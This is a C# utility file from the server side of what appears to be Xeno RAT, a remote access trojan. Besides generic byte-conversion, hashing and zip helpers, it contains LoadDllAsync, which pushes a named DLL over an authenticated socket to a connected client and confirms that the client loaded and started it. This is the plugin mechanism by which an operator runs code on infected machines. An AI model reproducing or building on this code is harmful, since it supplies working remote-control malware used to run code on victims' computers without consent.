using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_server
{
    class Utils
    {
        public static long BytesToLong(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return (long)data[offset] |
                       (long)data[offset + 1] << 8 |
                       (long)data[offset + 2] << 16 |
                       (long)data[offset + 3] << 24 |
                       (long)data[offset + 4] << 32 |
                       (long)data[offset + 5] << 40 |
                       (long)data[offset + 6] << 48 |
                       (long)data[offset + 7] << 56;
            }
            else
            {
                return (long)data[offset + 7] |
                       (long)data[offset + 6] << 8 |
                       (long)data[offset + 5] << 16 |
                       (long)data[offset + 4] << 24 |
                       (long)data[offset + 3] << 32 |
                       (long)data[offset + 2] << 40 |
                       (long)data[offset + 1] << 48 |
                       (long)data[offset] << 56;
            }
        }

        public static byte[] LongToBytes(long data)
        {
            byte[] bytes = new byte[8];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
                bytes[4] = (byte)(data >> 32);
                bytes[5] = (byte)(data >> 40);
                bytes[6] = (byte)(data >> 48);
                bytes[7] = (byte)(data >> 56);
            }
            else
            {
                bytes[7] = (byte)data;
                bytes[6] = (byte)(data >> 8);
                bytes[5] = (byte)(data >> 16);
                bytes[4] = (byte)(data >> 24);
                bytes[3] = (byte)(data >> 32);
                bytes[2] = (byte)(data >> 40);
                bytes[1] = (byte)(data >> 48);
                bytes[0] = (byte)(data >> 56);
            }

            return bytes;
        }
        public static async Task<bool> LoadDllAsync(Node clientsubsock, string dllname, byte[] dll, Action<string, Color> Logcallback=null)
        {
            clientsubsock.SetRecvTimeout(20000);
            if (Logcallback != null)
            {
                Logcallback($"Loading {dllname} dll...", Color.Blue);
            }
            if (clientsubsock.SockType != 2)
            {
                if (Logcallback != null)
                {
                    Logcallback($"Loading {dllname} dll failed!", Color.Red);
                }
                return false;
            }
            byte[] loadll = new byte[] { 1 };
            await clientsubsock.SendAsync(loadll);
            await clientsubsock.SendAsync(Encoding.UTF8.GetBytes(dllname));
            byte[] dllinfo = await clientsubsock.ReceiveAsync();
            if (dllinfo[0] == 1)
            {
                await clientsubsock.SendAsync(dll);
            }
            else if (dllinfo[0] == 2)
            {
                if (Logcallback != null) 
                {
                    Logcallback($"Loading {dllname} dll failed!", Color.Red);
                }
                return false;
            }
            byte[] dllloadinfo = await clientsubsock.ReceiveAsync();
            if (dllloadinfo[0] != 3)
            {
                if (Logcallback != null)
                {
                    Logcallback($"Starting {dllname} dll failed !", Color.Red);
                }
                return false;
            }
            clientsubsock.ResetRecvTimeout();
            if (Logcallback != null)
            {
                Logcallback($"{dllname} dll loaded!", Color.Green);
            }
            return true;
        }
        public static byte[] CalculateSha256Bytes(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);
                return hashBytes;
            }
        }

        public static void AddTextToZip(ZipArchive archive, string entryName, string text)
        {
            ZipArchiveEntry entry = archive.CreateEntry(entryName, CompressionLevel.Optimal);

            using (Stream stream = entry.Open())
            using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8))
            {
                writer.Write(text);
            }
        }

        public static async Task<int> SetType2setIdAsync(Node subnode)
        {
            if (subnode.SockType == 2)
            {
                int setID = subnode.Parent.SubNodeIdCount;
                subnode.Parent.SubNodeIdCount += 1;
                byte[] id = subnode.sock.IntToBytes(setID);
                byte[] opcode = new byte[] { 2 };
                byte[] data = subnode.sock.Concat(opcode, id);
                await subnode.SendAsync(data);
                await subnode.ReceiveAsync();
                return setID;
            }
            return -1;
        }
        public static async Task Type2returnAsync(Node subNode) 
        {
            if (subNode.SockType == 2) 
            {
                byte[] opcode = new byte[] { 3 };
                await subNode.SendAsync(opcode);
            }
        }
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int ID, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }
    }
}
